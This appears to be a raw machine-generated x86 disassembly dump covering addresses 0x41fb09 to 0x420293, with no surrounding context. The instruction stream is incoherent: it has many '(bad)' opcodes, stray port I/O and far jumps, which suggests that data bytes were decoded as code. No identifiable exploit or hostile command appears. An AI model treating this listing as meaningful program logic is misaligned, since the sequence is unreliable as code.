  41fb09:	test   DWORD PTR [ebx+edi*2],edx
  41fb0c:	int3   
  41fb0d:	sbb    BYTE PTR [ebp-0x9764ad5],dh
  41fb13:	jbe    0x41fb8d
  41fb15:	ds retf 
  41fb17:	ja     0x41fabf
  41fb19:	enter  0x624d,0xba
  41fb1d:	push   edx
  41fb1e:	rcl    BYTE PTR [ebx+0x72],1
  41fb21:	jb     0x41fb3e
  41fb23:	popf   
  41fb24:	fldln2 
  41fb26:	je     0x41fae2
  41fb28:	adc    ebp,DWORD PTR [ebx]
  41fb2a:	xor    BYTE PTR [edi+0x3a],0x39
  41fb2e:	lods   al,BYTE PTR ds:[esi]
  41fb2f:	adc    dl,BYTE PTR [ecx-0xaedf0e5]
  41fb35:	jmp    0x94c474be
  41fb3a:	(bad)  
  41fb3b:	push   esi
  41fb3c:	sbb    bl,bl
  41fb3e:	xor    cl,BYTE PTR [esi]
  41fb40:	fld    st(3)
  41fb42:	and    ebx,DWORD PTR [ebx]
  41fb44:	jmp    0x41fb94
  41fb46:	sbb    al,bh
  41fb48:	push   0xffffff93
  41fb4a:	pop    ebx
  41fb4b:	push   edi
  41fb4c:	push   es
  41fb4d:	cmp    eax,0x33c98079
  41fb52:	(bad)  
  41fb53:	mov    ebx,0x29781a0b
  41fb58:	(bad)  
  41fb59:	loop   0x41fbda
  41fb5b:	in     al,dx
  41fb5c:	xor    dl,BYTE PTR [esi+0x1641797c]
  41fb62:	jne    0x41fb36
  41fb64:	xor    ebx,DWORD PTR [edi]
  41fb66:	mov    ds:0x7d291302,eax
  41fb6b:	or     al,0x79
  41fb6d:	xchg   DWORD PTR [ebx+0x298cec55],eax
  41fb73:	in     eax,0x89
  41fb75:	or     BYTE PTR [ebx-0xd],cl
  41fb78:	add    DWORD PTR [edx-0x3a90d45a],ebx
  41fb7e:	push   cs
  41fb7f:	adc    al,0x16
  41fb81:	call   0x2e21:0x7fc70058
  41fb88:	add    ch,ah
  41fb8a:	mov    ds:0x35ddbd71,eax
  41fb8f:	inc    ebp
  41fb90:	lea    ebx,[eax]
  41fb92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fb93:	adc    dl,dl
  41fb95:	mov    bl,0x3e
  41fb97:	inc    esi
  41fb98:	inc    ecx
  41fb99:	test   ebx,0x25699976
  41fb9f:	jno    0x41fb3b
  41fba1:	mov    bl,0xe3
  41fba3:	xor    DWORD PTR [esi+0x6d],eax
  41fba6:	test   BYTE PTR [ecx-0x1e],ch
  41fba9:	xchg   ecx,eax
  41fbaa:	mov    ch,cl
  41fbac:	cli    
  41fbad:	xchg   DWORD PTR [esi],esp
  41fbaf:	inc    esp
  41fbb0:	cmp    eax,ecx
  41fbb2:	or     DWORD PTR [ecx+ebp*8+0x1ccb45e6],esi
  41fbb9:	jbe    0x41fbd2
  41fbbb:	push   ecx
  41fbbc:	lods   al,BYTE PTR ds:[esi]
  41fbbd:	or     ebp,DWORD PTR [ebp+ebp*2+0x7e]
  41fbc1:	and    ecx,DWORD PTR [ebx-0x52681311]
  41fbc7:	xchg   ebp,eax
  41fbc8:	fs in  al,dx
  41fbca:	(bad)  
  41fbcc:	add    DWORD PTR [eax+0x47],eax
  41fbcf:	mov    DWORD PTR [ebp-0x47],esp
  41fbd2:	ret    0xfbad
  41fbd5:	fwait
  41fbd6:	xchg   BYTE PTR [edx],bl
  41fbd8:	inc    esi
  41fbd9:	imul   ecx,DWORD PTR es:[ebp+0x1c2fc4aa],0xffffff99
  41fbe1:	mov    eax,ds:0x411d4da9
  41fbe6:	lods   eax,DWORD PTR ds:[esi]
  41fbe7:	jne    0x41fc00
  41fbe9:	std    
  41fbea:	sbb    al,0xa3
  41fbec:	es (bad) 
  41fbee:	(bad)  
  41fbef:	fidiv  DWORD PTR [ebx+ebx*2-0x30]
  41fbf3:	or     DWORD PTR [esi],0x3f
  41fbf6:	sar    dh,cl
  41fbf8:	es imul esp,esp,0x30
  41fbfc:	mov    ds:0x3164fbbc,al
  41fc01:	js     0x41fc62
  41fc03:	ret    0xe13c
  41fc06:	mov    al,0x66
  41fc08:	push   esi
  41fc09:	loope  0x41fba6
  41fc0b:	xchg   esp,eax
  41fc0c:	adc    dl,dl
  41fc0e:	leave  
  41fc0f:	or     DWORD PTR [ebx+0x185a08f0],ebx
  41fc15:	fs mov ecx,0x2bee655a
  41fc1b:	dec    eax
  41fc1c:	jns    0x41fbc0
  41fc1e:	push   esi
  41fc1f:	lds    ebp,FWORD PTR fs:[ebx]
  41fc22:	pusha  
  41fc23:	xchg   esp,eax
  41fc24:	push   es
  41fc25:	xchg   esi,eax
  41fc26:	xchg   edx,eax
  41fc27:	or     dh,0x76
  41fc2a:	fsub   DWORD PTR fs:[eax+0x7]
  41fc2e:	daa    
  41fc2f:	leave  
  41fc30:	push   ecx
  41fc31:	sub    edi,0xd6cc264
  41fc37:	cld    
  41fc38:	sub    DWORD PTR [edi-0x5133b748],0x1a
  41fc3f:	or     DWORD PTR [ebp-0x310bb927],edi
  41fc45:	in     eax,0x5a
  41fc47:	mov    eax,ds:0xb02e48ad
  41fc4c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc4d:	add    al,0x59
  41fc4f:	mov    ecx,0x7495087c
  41fc54:	jo     0x41fbd9
  41fc56:	lock popf 
  41fc58:	addr16 enter 0xe65,0xa
  41fc5d:	xor    al,0xf8
  41fc5f:	mov    edx,0xbdc3d5d0
  41fc64:	push   esp
  41fc65:	pop    ds
  41fc66:	stos   DWORD PTR es:[edi],eax
  41fc67:	aas    
  41fc68:	inc    edi
  41fc69:	add    ebp,DWORD PTR [edx]
  41fc6b:	in     al,dx
  41fc6c:	imul   edi,DWORD PTR [esi+esi*1+0x6f],0x8252493d
  41fc74:	scas   eax,DWORD PTR es:[edi]
  41fc75:	imul   ebp,DWORD PTR [ecx+0x3931ce2b],0x5
  41fc7c:	loop   0x41fca1
  41fc7e:	loopne 0x41fcb5
  41fc80:	les    ebx,FWORD PTR [eax-0x3d]
  41fc83:	push   edx
  41fc84:	inc    ebx
  41fc85:	push   cs
  41fc86:	sbb    ebp,DWORD PTR [edx+0x61]
  41fc89:	pop    edi
  41fc8a:	add    BYTE PTR [ecx+0x2f759d7d],dh
  41fc90:	jmp    0x7576b817
  41fc95:	push   0x427ad1fd
  41fc9a:	sbb    al,0xac
  41fc9c:	stos   DWORD PTR es:[edi],eax
  41fc9d:	out    dx,eax
  41fc9e:	repnz lock and eax,0xe325885
  41fca5:	nop
  41fca6:	mov    edx,0xf2a8a8b1
  41fcab:	cld    
  41fcac:	inc    edx
  41fcad:	cmp    ah,BYTE PTR [eax]
  41fcaf:	shl    eax,1
  41fcb1:	xchg   esp,eax
  41fcb2:	int3   
  41fcb3:	(bad)  
  41fcb4:	mov    esi,0xc08eadb6
  41fcb9:	pusha  
  41fcba:	pop    edi
  41fcbb:	or     esp,eax
  41fcbd:	in     eax,dx
  41fcbe:	mov    edx,0x77c837a4
  41fcc3:	cs cmc 
  41fcc5:	je     0x41fd21
  41fcc7:	xor    esi,DWORD PTR [edx+ebx*8+0x26]
  41fccb:	push   ds
  41fccc:	in     eax,dx
  41fccd:	inc    ebp
  41fcce:	sub    eax,0x460bf6ea
  41fcd3:	push   ecx
  41fcd4:	dec    ebp
  41fcd5:	cs and eax,0x95143884
  41fcdb:	jg     0x41fd32
  41fcdd:	fstp   QWORD PTR ds:0xdbcd11fc
  41fce3:	lea    ebx,[edi-0x667e8a61]
  41fce9:	pop    edi
  41fcea:	bound  eax,QWORD PTR [esi+0x49]
  41fced:	loopne 0x41fd20
  41fcef:	lahf   
  41fcf0:	adc    al,0xc3
  41fcf2:	pop    ds
  41fcf3:	mov    al,0x63
  41fcf5:	xchg   ah,ah
  41fcf7:	iret   
  41fcf8:	sti    
  41fcf9:	pusha  
  41fcfa:	gs ret 
  41fcfc:	daa    
  41fcfd:	sbb    BYTE PTR [ecx-0x2426a78f],bh
  41fd03:	push   esp
  41fd04:	jo     0x41fd24
  41fd06:	adc    al,BYTE PTR [esi]
  41fd08:	cld    
  41fd09:	and    eax,0x83cea508
  41fd0e:	and    DWORD PTR [edi+eiz*1],esp
  41fd11:	dec    esp
  41fd12:	mov    esp,0x34fe2cc
  41fd17:	test   eax,0xeabfa908
  41fd1c:	sar    ebx,1
  41fd1e:	mov    ebp,0x45831863
  41fd23:	mov    al,0x78
  41fd25:	inc    eax
  41fd26:	aas    
  41fd27:	push   edi
  41fd28:	jg     0x41fd10
  41fd2a:	into   
  41fd2b:	cmp    ah,al
  41fd2d:	jbe    0x41fdad
  41fd2f:	(bad)  
  41fd30:	push   edx
  41fd31:	dec    ebx
  41fd32:	push   esp
  41fd33:	outs   dx,DWORD PTR ds:[esi]
  41fd34:	int    0xf5
  41fd36:	add    ecx,DWORD PTR ss:[ebp+0x5a402fa9]
  41fd3d:	cmc    
  41fd3e:	mov    ch,0x9
  41fd40:	inc    edx
  41fd41:	mov    ebp,0x95121741
  41fd46:	fsubr  QWORD PTR [ebp-0x4e549f8]
  41fd4c:	or     bh,bl
  41fd4e:	fbstp  TBYTE PTR [ebx-0x3d]
  41fd51:	adc    cl,al
  41fd53:	jno    0x41fd95
  41fd55:	rol    ecx,0xf4
  41fd58:	icebp  
  41fd59:	mov    al,ch
  41fd5b:	retf   0x8934
  41fd5e:	repnz call 0x9d10:0x4012340
  41fd66:	shl    BYTE PTR [edx],0xbb
  41fd69:	test   DWORD PTR ds:0x4927e58b,edx
  41fd6f:	int3   
  41fd70:	sub    ebx,0xee5ba8e1
  41fd76:	pop    ebx
  41fd77:	cdq    
  41fd78:	(bad)  
  41fd79:	stos   BYTE PTR es:[edi],al
  41fd7a:	xchg   esi,eax
  41fd7b:	sub    esp,DWORD PTR [edi-0x4b]
  41fd7e:	pop    ebp
  41fd7f:	and    BYTE PTR [edi+edi*4],al
  41fd82:	adc    edx,DWORD PTR [ecx+edx*2+0x540b142c]
  41fd89:	jo     0x41fde0
  41fd8b:	xor    eax,0x4d44d267
  41fd90:	sahf   
  41fd91:	dec    esp
  41fd92:	psubusw mm7,QWORD PTR [eax-0x4b]
  41fd96:	mov    al,ds:0xe814266b
  41fd9b:	lock cmc 
  41fd9d:	and    ah,BYTE PTR [eax-0x36]
  41fda0:	pop    ebx
  41fda1:	jne    0x41fddd
  41fda3:	cmc    
  41fda4:	mov    dh,0x93
  41fda6:	rol    ebp,cl
  41fda8:	retf   
  41fda9:	cs aas 
  41fdab:	pusha  
  41fdac:	arpl   sp,si
  41fdae:	int    0xed
  41fdb0:	mov    eax,0x92b7bfd7
  41fdb5:	popa   
  41fdb6:	jb     0x41fe21
  41fdb8:	(bad)  
  41fdb9:	test   al,0xad
  41fdbb:	aaa    
  41fdbc:	test   DWORD PTR ds:0xfcc1f3fd,0xd23ae2ea
  41fdc6:	fdivrp st(7),st
  41fdc8:	loop   0x41fd86
  41fdca:	stos   DWORD PTR es:[edi],eax
  41fdcb:	jmp    0x41fe0e
  41fdcd:	out    0x84,al
  41fdcf:	out    dx,eax
  41fdd0:	jne    0x41fd5a
  41fdd2:	mov    esp,0xea3117cf
  41fdd7:	retf   0x1b38
  41fdda:	adc    DWORD PTR [edi+0x4948a9d9],esi
  41fde0:	sbb    al,0xd7
  41fde2:	lea    esi,[eax+0x3dbe2108]
  41fde8:	enter  0xcf5e,0xa3
  41fdec:	mov    ecx,0x82c85857
  41fdf1:	iret   
  41fdf2:	scas   al,BYTE PTR es:[edi]
  41fdf3:	xlat   BYTE PTR ds:[ebx]
  41fdf4:	sahf   
  41fdf5:	outs   dx,BYTE PTR ds:[esi]
  41fdf6:	rcl    DWORD PTR [ebp-0x20],cl
  41fdf9:	ja     0x41fdbb
  41fdfb:	add    BYTE PTR [ecx-0x234e02a4],ah
  41fe01:	pop    ebx
  41fe02:	cmp    ebp,DWORD PTR [esi+0x773cd5c2]
  41fe08:	nop
  41fe09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe0a:	xchg   edi,eax
  41fe0b:	push   esp
  41fe0c:	aas    
  41fe0d:	push   0x96343f49
  41fe12:	sub    ch,cl
  41fe14:	lock lahf 
  41fe16:	sub    BYTE PTR [edx],bl
  41fe18:	popa   
  41fe19:	in     eax,0xde
  41fe1b:	dec    ebp
  41fe1c:	xchg   DWORD PTR [ebx],edi
  41fe1e:	nop
  41fe1f:	lods   al,BYTE PTR ds:[esi]
  41fe20:	xchg   esp,eax
  41fe21:	arpl   WORD PTR [ebx-0x6522791],cx
  41fe27:	xchg   DWORD PTR [esi+0x2a],eax
  41fe2a:	xchg   ebx,eax
  41fe2b:	retf   
  41fe2c:	cmp    BYTE PTR [ecx+0x6c],bh
  41fe2f:	sbb    ecx,edi
  41fe31:	or     DWORD PTR [edi],0xffffffb0
  41fe34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe35:	scas   eax,DWORD PTR es:[edi]
  41fe36:	(bad)  
  41fe37:	imul   ecx,edi,0xffffff8d
  41fe3a:	int    0xce
  41fe3c:	mov    al,ds:0xc326bf14
  41fe41:	dec    ecx
  41fe42:	ds dec esi
  41fe44:	packuswb mm6,QWORD PTR [edx-0x27ae3380]
  41fe4b:	imul   edi,DWORD PTR ss:[ebx-0xbcf0a00],0x22
  41fe53:	lods   eax,DWORD PTR ds:[esi]
  41fe54:	mov    ds:0x3d102b94,al
  41fe59:	fwait
  41fe5a:	adc    BYTE PTR [eax+0x79],cl
  41fe5d:	adc    al,0x8
  41fe5f:	in     al,dx
  41fe60:	jae    0x41fe72
  41fe62:	imul   edx,DWORD PTR [esi-0x1922be21],0x35
  41fe69:	cmp    DWORD PTR [eiz*2+0x4973d81],0xd753d152
  41fe74:	ror    DWORD PTR [ecx+0x34],cl
  41fe77:	inc    esi
  41fe78:	and    BYTE PTR [eax+0x44b60347],dh
  41fe7e:	outs   dx,BYTE PTR gs:[esi]
  41fe80:	imul   BYTE PTR [eax*1-0x20406674]
  41fe87:	pop    edi
  41fe88:	iret   
  41fe89:	cmp    BYTE PTR [edi+0x1b],dh
  41fe8c:	adc    bh,0x74
  41fe8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe90:	ja     0x41fe8e
  41fe92:	dec    ebx
  41fe93:	les    ebp,FWORD PTR [esi]
  41fe95:	call   0xf9d:0xf71929e6
  41fe9c:	inc    ebx
  41fe9d:	xor    eax,0x362fced5
  41fea2:	dec    edi
  41fea3:	xor    ch,BYTE PTR [ebx-0x40]
  41fea6:	sbb    bl,BYTE PTR [edx+0x440bf7fb]
  41feac:	mov    bh,0xec
  41feae:	cdq    
  41feaf:	aam    0x3e
  41feb1:	sbb    DWORD PTR [ebp+ecx*1+0x6dbd787d],ebx
  41feb8:	push   0xffffffe6
  41feba:	mov    dl,0x17
  41febc:	ret    0xcfd2
  41febf:	pushf  
  41fec0:	into   
  41fec1:	xchg   ebp,eax
  41fec2:	fcmovbe st,st(1)
  41fec4:	lods   eax,DWORD PTR ds:[esi]
  41fec5:	dec    ebx
  41fec6:	jmp    0xff1d302b
  41fecb:	or     BYTE PTR [edi+0x26],ch
  41fece:	pop    ecx
  41fecf:	test   BYTE PTR [ebx+0x20],dl
  41fed2:	lds    eax,FWORD PTR ds:0x9e32d14a
  41fed8:	mov    ds:0xf2cd8df2,eax
  41fedd:	inc    edi
  41fede:	or     ecx,DWORD PTR [esi]
  41fee0:	pop    edx
  41fee1:	cmp    ebp,DWORD PTR [edi-0x5f99033a]
  41fee7:	aad    0xb8
  41fee9:	sbb    BYTE PTR [ebx+esi*8-0xf],al
  41feed:	jle    0x41ff02
  41feef:	adc    DWORD PTR [ebx],0x53
  41fef2:	call   0xe5231ebf
  41fef7:	je     0x41fe90
  41fef9:	mov    edi,ebp
  41fefb:	ss and eax,0xe2435a5a
  41ff01:	dec    esi
  41ff02:	mov    ah,0x9e
  41ff04:	mov    ds:0x562de4db,eax
  41ff09:	into   
  41ff0a:	mov    al,0x2f
  41ff0c:	call   0x3ec2:0x342bd180
  41ff13:	and    BYTE PTR [eax],bl
  41ff15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff16:	inc    ebx
  41ff17:	adc    BYTE PTR [eax+0x4b],dl
  41ff1a:	add    al,0x22
  41ff1c:	jnp    0x41ff45
  41ff1e:	jecxz  0x41fee1
  41ff20:	je     0x41ff30
  41ff22:	inc    ebp
  41ff23:	cld    
  41ff24:	sbb    ebx,ecx
  41ff26:	adc    BYTE PTR [ebp+0x64],dl
  41ff29:	sti    
  41ff2a:	add    BYTE PTR [edi-0x68c01a5f],0xd0
  41ff31:	mov    bl,ah
  41ff33:	mov    ebx,0x7c4f641d
  41ff38:	pop    ebp
  41ff39:	jns    0x41ff47
  41ff3b:	and    ah,dl
  41ff3d:	mov    dh,BYTE PTR gs:[esi]
  41ff40:	add    BYTE PTR [ecx-0x28],dh
  41ff43:	push   ss
  41ff44:	bound  ebp,QWORD PTR [edx+eiz*4+0x69]
  41ff48:	xchg   esi,eax
  41ff49:	and    al,0xb1
  41ff4b:	sbb    DWORD PTR [edi],0xffffff80
  41ff4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ff4f:	push   ebp
  41ff50:	sar    BYTE PTR [edx-0x4f],cl
  41ff53:	das    
  41ff54:	leave  
  41ff55:	repnz loop 0x41ff09
  41ff58:	cmp    ecx,DWORD PTR [edi+0x70154093]
  41ff5e:	cwde   
  41ff5f:	add    dh,BYTE PTR [edx]
  41ff61:	ret    
  41ff62:	jp     0x41ff4a
  41ff64:	ss cmp ch,cl
  41ff67:	repz push cs
  41ff69:	bound  eax,QWORD PTR ds:0x314a0138
  41ff6f:	pop    edi
  41ff70:	xchg   ecx,eax
  41ff71:	(bad)  
  41ff72:	ss dec eax
  41ff74:	call   FWORD PTR [edi+0x21]
  41ff77:	sbb    eax,0xc1bff14c
  41ff7c:	loope  0x41ff03
  41ff7e:	adc    esp,DWORD PTR [ebx]
  41ff80:	je     0x41ff16
  41ff82:	dec    ebx
  41ff83:	in     eax,0x68
  41ff85:	loop   0x41ff97
  41ff87:	add    ebp,DWORD PTR [eax+0x5]
  41ff8a:	out    0x11,al
  41ff8c:	clc    
  41ff8d:	add    BYTE PTR [esi+eiz*4-0x6a734984],bh
  41ff94:	shl    BYTE PTR [eax+0xb],1
  41ff97:	repz pushf 
  41ff99:	and    DWORD PTR [ebx+ecx*4],edi
  41ff9c:	iret   
  41ff9d:	iret   
  41ff9e:	and    DWORD PTR [edx+edi*1-0x47a3b9d0],ebx
  41ffa5:	mov    ebp,0xd3215822
  41ffaa:	std    
  41ffab:	sub    bl,ch
  41ffad:	daa    
  41ffae:	push   esp
  41ffaf:	mov    ebp,0x5bfd5411
  41ffb4:	popa   
  41ffb5:	pop    edi
  41ffb6:	sub    eax,0x4077aa54
  41ffbb:	or     edi,DWORD PTR ds:0x570fc96d
  41ffc1:	xor    bl,0x5c
  41ffc4:	cmp    BYTE PTR [edx],ch
  41ffc6:	lock inc esp
  41ffc8:	mov    gs,WORD PTR [ecx+0xc1cc41c]
  41ffce:	retf   0xcdf2
  41ffd1:	and    DWORD PTR [eax-0x2eec9bf4],ebx
  41ffd7:	or     BYTE PTR [eax],bh
  41ffd9:	iret   
  41ffda:	mov    ds:0x71c80ac3,al
  41ffdf:	jo     0x41ff63
  41ffe1:	adc    esi,DWORD PTR [ecx-0x7287c6cd]
  41ffe7:	mov    ebp,0xec307ec2
  41ffec:	or     eax,0xf65553d2
  41fff1:	jo     0x420062
  41fff3:	call   0xddd28e56
  41fff8:	imul   ebx,DWORD PTR [eax+0x395bee45],0x19befec5
  420002:	outs   dx,BYTE PTR ds:[esi]
  420003:	cwde   
  420004:	xchg   edi,eax
  420005:	pop    esi
  420006:	mov    eax,ds:0xf90df691
  42000b:	lods   eax,DWORD PTR ds:[esi]
  42000c:	pop    ebp
  42000d:	lsl    edx,WORD PTR [ecx+0x64259183]
  420014:	out    dx,al
  420015:	out    0xa5,eax
  420017:	mov    ah,0xa3
  420019:	mov    ch,0x5e
  42001b:	adc    BYTE PTR [edi-0x73],bh
  42001e:	ret    
  42001f:	push   eax
  420020:	xor    al,0x10
  420022:	lds    edi,FWORD PTR [eax+0x5aaeeb65]
  420028:	shl    DWORD PTR [eax],1
  42002a:	adc    edx,DWORD PTR [ecx]
  42002c:	cmp    al,0xbe
  42002e:	sub    DWORD PTR [esi-0x204d3f27],esi
  420034:	jns    0x42001e
  420036:	rcl    DWORD PTR [ebx],1
  420038:	mov    ebp,0x522fda93
  42003d:	jle    0x41ffd0
  42003f:	test   DWORD PTR [ebx],esp
  420041:	into   
  420042:	push   edx
  420043:	loopne 0x42001f
  420045:	sbb    eax,0xddcf47c5
  42004a:	mov    edi,0x307cf9e5
  42004f:	(bad)  
  420050:	pop    edx
  420051:	xchg   esp,eax
  420052:	pop    esi
  420053:	sbb    BYTE PTR es:[ecx+0x2c7bbcc3],ch
  42005a:	fidiv  DWORD PTR [edx-0x4f0f8f98]
  420060:	imul   esi,DWORD PTR [edi+0x47],0xe222560
  420067:	jg     0x42009f
  420069:	jl     0x4200bd
  42006b:	and    eax,0x84daa440
  420070:	gs jg  0x420076
  420073:	mov    edx,0xe79792e5
  420078:	ds pop esp
  42007a:	pop    ss
  42007b:	or     cl,BYTE PTR [edi+0x39842545]
  420081:	stos   DWORD PTR es:[edi],eax
  420082:	and    al,0x91
  420084:	adc    al,0x22
  420086:	xor    eax,0xf0878c25
  42008b:	mov    ch,0xa6
  42008d:	ss push cs
  42008f:	div    DWORD PTR [eax+edi*8+0x23]
  420093:	pop    es
  420094:	mov    ds,WORD PTR [eax]
  420096:	add    ecx,DWORD PTR [ebp+eiz*1+0x69cc062e]
  42009d:	sbb    DWORD PTR ds:0xbf7a7d66,edx
  4200a3:	jo     0x4200ba
  4200a5:	push   esp
  4200a6:	sub    eax,0xd87c10e8
  4200ab:	push   0xffffff90
  4200ad:	rcr    edi,0x43
  4200b0:	(bad)  
  4200b1:	sbb    edx,ecx
  4200b3:	push   edx
  4200b4:	mul    bl
  4200b6:	sub    esi,esi
  4200b8:	loop   0x420106
  4200ba:	hlt    
  4200bb:	jp     0x4200ab
  4200bd:	push   edx
  4200be:	aaa    
  4200bf:	pop    edx
  4200c0:	cdq    
  4200c1:	jmp    0x600f7500
  4200c6:	hlt    
  4200c7:	cmp    DWORD PTR [eax],esi
  4200c9:	sbb    BYTE PTR [esi-0x2917cea6],bh
  4200cf:	cmp    bl,BYTE PTR [ebp+eiz*4+0x48378e31]
  4200d6:	jge    0x4200a8
  4200d8:	inc    edx
  4200d9:	sub    ch,BYTE PTR [ebx+esi*4]
  4200dc:	mov    ebx,0xaa57ca76
  4200e1:	mov    ds:0x2995ebdf,eax
  4200e6:	or     BYTE PTR [edx+0x36f79c4c],ah
  4200ec:	loop   0x42007b
  4200ee:	outs   dx,DWORD PTR ds:[esi]
  4200ef:	add    bh,BYTE PTR [ebx+0x3407339b]
  4200f5:	(bad)  [eax]
  4200f7:	jge    0x420110
  4200f9:	cmp    DWORD PTR [ebx+0x4e],0x74183ec9
  420100:	daa    
  420101:	imul   ecx,DWORD PTR [ecx],0xad33590f
  420107:	mov    edx,0xccee942e
  42010c:	(bad)  
  42010d:	mov    cl,0xfd
  42010f:	mov    WORD PTR [ebx+0x17218cc0],gs
  420115:	inc    edi
  420116:	xchg   ebx,eax
  420117:	pop    edx
  420118:	leave  
  420119:	addr16 loope 0x4200f5
  42011c:	cld    
  42011d:	and    bh,BYTE PTR ds:0x6a548f64
  420123:	ins    BYTE PTR es:[edi],dx
  420124:	nop
  420125:	das    
  420126:	xchg   edi,eax
  420127:	pop    esi
  420128:	ds pop edx
  42012a:	sbb    ch,BYTE PTR [eax]
  42012c:	inc    ebp
  42012d:	and    BYTE PTR [edi-0x62f07298],bh
  420133:	mov    eax,DWORD PTR [edx+0x7c]
  420136:	dec    esp
  420137:	jmp    0x79eb11a0
  42013c:	mov    ds:0x233b715e,al
  420141:	mov    esi,0x46293ffc
  420147:	xor    esi,ebp
  420149:	dec    ebp
  42014a:	hlt    
  42014b:	pop    ecx
  42014c:	or     bh,BYTE PTR [ecx]
  42014e:	in     al,dx
  42014f:	dec    esi
  420150:	fdivr  QWORD PTR [eax-0x631ff103]
  420156:	popa   
  420157:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420158:	sub    BYTE PTR [ebp-0x39a67e72],cl
  42015e:	add    ecx,ebp
  420160:	xor    edi,ebp
  420162:	data16 outs dx,BYTE PTR ds:[esi]
  420164:	into   
  420165:	cmp    edi,DWORD PTR [eax+0x7c091793]
  42016b:	jae    0x4201b8
  42016d:	fdiv   QWORD PTR [esi]
  42016f:	les    ebp,FWORD PTR [edi]
  420171:	retf   
  420172:	(bad)  
  420174:	sti    
  420175:	cmp    cl,BYTE PTR [esi+eax*4-0x5ed2b3d3]
  42017c:	sub    ecx,ecx
  42017e:	pop    ecx
  42017f:	loop   0x420190
  420181:	jno    0x420103
  420183:	or     al,0x0
  420185:	add    BYTE PTR [eax],al
  420187:	add    BYTE PTR [eax],al
  420189:	add    BYTE PTR [ecx+0x57],bl
  42018c:	inc    ecx
  42018d:	dec    ebx
  42018e:	dec    edi
  42018f:	pop    edi
  420190:	pop    ebx
  420191:	push   edi
  420192:	sub    al,0x52
  420194:	xchg   DWORD PTR [ebx+0x49],esi
  420197:	xor    bl,ah
  420199:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42019a:	(bad)  
  42019b:	nop
  42019c:	add    DWORD PTR [eax],eax
  42019e:	add    BYTE PTR [esi],0x0
  4201a1:	add    BYTE PTR [ebp+0x5d],bh
  4201a4:	in     eax,0xfd
  4201a6:	sub    esp,ebp
  4201a8:	jmp    0x385dca2e
  4201ad:	in     eax,0xb8
  4201af:	in     al,0xef
  4201b1:	aaa    
  4201b2:	in     eax,0x8b
  4201b4:	sti    
  4201b5:	fld    QWORD PTR [edi-0x520faa1c]
  4201bb:	(bad)  
  4201bd:	jno    0x42021e
  4201bf:	ret    
  4201c0:	sbb    eax,0xb3e3af35
  4201c5:	test   BYTE PTR [esi],bh
  4201c7:	xor    dl,BYTE PTR [esi+0x3a6ce247]
  4201cd:	pop    esp
  4201ce:	les    ebp,FWORD PTR [edi+edi*1]
  4201d1:	and    al,BYTE PTR [edx]
  4201d3:	mov    ah,dl
  4201d5:	outs   dx,DWORD PTR ds:[esi]
  4201d6:	sbb    dh,bl
  4201d8:	(bad)  
  4201d9:	push   esi
  4201da:	ds push 0x17
  4201dd:	popf   
  4201de:	retf   
  4201df:	xchg   edi,eax
  4201e0:	arpl   WORD PTR [edx+esi*8],sp
  4201e3:	cld    
  4201e4:	fdiv   QWORD PTR [eax]
  4201e6:	call   0x918b:0xa2a29a76
  4201ed:	mov    ch,0xd2
  4201ef:	seto   BYTE PTR [esi+ebx*8-0x4779bfed]
  4201f7:	jbe    0x42025d
  4201f9:	jg     0x42017b
  4201fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4201fc:	push   edi
  4201fd:	idiv   ecx
  4201ff:	pop    ss
  420200:	push   ds
  420201:	leave  
  420202:	fldcw  WORD PTR [ecx]
  420204:	ja     0x4201a6
  420206:	inc    eax
  420207:	cli    
  420208:	lods   eax,DWORD PTR ds:[esi]
  420209:	push   ecx
  42020a:	xchg   edi,eax
  42020b:	in     al,0x63
  42020d:	gs ja  0x4201c6
  420210:	ja     0x4201db
  420212:	pushf  
  420213:	pop    eax
  420214:	sar    DWORD PTR [esi],cl
  420216:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420217:	sub    DWORD PTR [ebx],edi
  420219:	(bad)  
  42021a:	mov    ds:0xbf3d5fa,eax
  42021f:	and    eax,0xc6364a3f
  420224:	arpl   WORD PTR [eax-0x7b],cx
  420227:	iret   
  420228:	lods   al,BYTE PTR ds:[esi]
  420229:	cmp    BYTE PTR [eax],bl
  42022b:	(bad)  
  42022c:	xor    bh,BYTE PTR [edx-0x3d]
  42022f:	mov    DWORD PTR [eax],ebp
  420231:	sti    
  420232:	mov    ecx,eax
  420234:	push   ebx
  420235:	pop    ss
  420236:	push   ds
  420237:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420238:	(bad)  
  420239:	mov    al,0x8
  42023b:	mov    ebp,DWORD PTR [ecx]
  42023d:	sahf   
  42023e:	cmp    BYTE PTR [edx],dh
  420240:	jae    0x420251
  420242:	sbb    ebx,DWORD PTR [ebp+0x719f7446]
  420248:	push   esp
  420249:	scas   al,BYTE PTR es:[edi]
  42024a:	pop    ecx
  42024b:	stos   BYTE PTR es:[edi],al
  42024c:	and    eax,esi
  42024e:	push   esp
  42024f:	stc    
  420250:	int    0x87
  420252:	loope  0x42025c
  420254:	stc    
  420255:	fisub  DWORD PTR [edi-0x47161020]
  42025b:	inc    edx
  42025c:	xchg   edi,eax
  42025d:	xchg   DWORD PTR [ebx+esi*2-0x80],ecx
  420261:	jmp    0x897a:0x75a8953
  420268:	test   eax,0x1dfd66c1
  42026d:	sahf   
  42026e:	stos   BYTE PTR es:[edi],al
  42026f:	je     0x42026a
  420271:	adc    al,0x69
  420273:	leave  
  420274:	div    DWORD PTR [eax]
  420276:	sti    
  420277:	xchg   DWORD PTR [eax-0x7e901e33],edi
  42027d:	loopne 0x42028f
  42027f:	inc    eax
  420280:	addr16 xchg ebp,eax
  420282:	jnp    0x4202d8
  420284:	xchg   edx,eax
  420285:	mov    cs,WORD PTR [ecx-0x2c]
  420288:	les    eax,FWORD PTR [edx-0xcb54797]
  42028e:	dec    esi
  42028f:	ja     0x420231
  420291:	xor    DWORD PTR [edx],ecx
  420293:	aad    0x8a
